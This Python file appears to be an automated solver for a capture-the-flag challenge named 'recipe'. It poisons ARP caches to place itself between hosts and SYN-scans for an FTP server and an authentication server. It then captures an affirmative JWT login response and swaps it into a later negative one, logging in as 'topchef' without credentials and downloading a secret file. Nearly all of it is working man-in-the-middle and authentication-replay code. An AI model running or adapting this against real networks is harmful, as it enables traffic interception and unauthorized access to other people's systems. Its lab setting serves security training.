# coding: utf-8
import scapy.all as scapy
import capture
import strategy
import logging
import re
import net
import jwt
import random
import socket
import time

logger = logging.getLogger(__name__)
socket.setdefaulttimeout(30)

class Strategy(strategy.Strategy):
    """
    This strategy solves the recipe challenge by replaceing a negative authentication repsonse with an affirmative
    The affirmative response is obtained by requeting a login as 'anonymous' to the FTP server
    The strategy then requests to login as 'topchef', which generates a negative response, but gets replaced in the TCP stream
    """
    name = "replay affirmative authentication"
    needsip = True
    challenges = ['recipe']

    authport = 4505
    scantimeout = 3
    flagpath = './secret/grandmas-praline-cheesecake.txt'

    class AuthenticationFilter(capture.TcpFilter):
        """AuthenticationFilter replaces negative authentication responses with affirmative once an example has been recorded"""
        def __init__(self, port=4505):
            super().__init__()
            self.port = port
            self.authed_token = None
            
        def filter(self, pkt):
            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
                tcp, raw = pkt[scapy.TCP], pkt[scapy.Raw]
                if tcp.sport == self.port:
                    try:
                        if jwt.decode(raw.load, verify=False)['auth']:
                            self.authed_token = raw.load
                        elif self.authed_token is not None:
                            raw.load = self.authed_token
                    except (jwt.DecodeError, KeyError):
                        pass
            return pkt

    def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
        sniffer = capture.Sniffer(iface=iface)
        mitm = capture.ArpMitmModule(filter=self.AuthenticationFilter())
        sniffer.register(
            mitm
        )

        with sniffer:
            ftpserver = None
            authserver = None

            # Scan for the ftp server and the auth server until they are up
            logging.info("Scanning {:s} for an FTP server and an auth server at tcp port {:d}".format(net.ifcidr(iface), self.authport))
            while ftpserver is None or authserver is None:
                # Use the MITM module's ARP cache to determine what other hosts are alive
                mitm.poisoner.arping()
                if not mitm.cache.cache.keys():
                    logging.debug("ARP cache is empty. Waiting for poisoner to discover hosts")
                    time.sleep(1)
                    continue

                ans, unans = scapy.sr(
                    scapy.IP(dst=list(mitm.cache.cache.keys()))/scapy.TCP(sport=random.randint(32000, 50000), dport=[21, self.authport], flags="S"),
                    timeout=self.scantimeout
                )

                for req, resp in ans:
                    if all(layer in resp for layer in (scapy.IP, scapy.TCP)):
                        tcp = resp[scapy.TCP]
                        if tcp.flags == capture.TcpFlags.SYN | capture.TcpFlags.ACK:
                            if tcp.sport == 21:
                                ftpserver = (resp[scapy.IP].src, 21)
                            elif tcp.sport == self.authport:
                                authserver = (resp[scapy.IP].src, self.authport)

            # Connect to the FTP server and login as 'anonymous' to trigger a succesful authentication exchange
            logging.info("Loging into the FTP server as 'anonymous'")
            with socket.socket() as cmdsocket:
                cmdsocket.connect(ftpserver)
                cmdsocket.sendall(b'USER anonymous\r\nPASS\r\n')
                while b'230' not in cmdsocket.recv(4096):
                    pass
                cmdsocket.shutdown(socket.SHUT_RDWR)

            # Connect to the FTP server and login as 'topchef'. This will work because of the AuthenticationFilter
            logging.info("Loging into the FTP server as 'topchef'")
            with socket.socket() as cmdsocket, socket.socket() as datasocket:
                cmdsocket.connect(ftpserver)
                cmdsocket.sendall(b'USER topchef\r\nPASS\r\n')
                while b'230' not in cmdsocket.recv(4096):
                    pass

                logging.info("Downloading the secret recipe")
                # Retrieve the secret recipe and return the flag
                addr, port = net.ifaddr(iface), random.randint(32000, 50000)
                datasocket.bind((str(addr), port))
                datasocket.listen(1)
                cmdsocket.sendall('RETR {:s}\r\nPORT {:d},{:d},{:d},{:d},{:d},{:d}\r\n'.format(
                    self.flagpath,
                    int(addr & 0xFF000000) >> 24,
                    int(addr & 0x00FF0000) >> 16,
                    int(addr & 0x0000FF00) >> 8,
                    int(addr & 0x000000FF),
                    (port & 0xFF00) >> 8,
                    (port & 0x00FF)
                ).encode('utf-8'))
                while b'150' not in cmdsocket.recv(4096):
                    pass
                conn, _ = datasocket.accept()
                data = b''
                flag = None
                while flag is None:
                    data += conn.recv(4096)
                    m = re.search(flagpattern, data.decode('utf-8', "ignore"))
                    if m:
                        flag = m.group(0)

                cmdsocket.shutdown(socket.SHUT_RDWR)
                datasocket.shutdown(socket.SHUT_RDWR)

        return flag
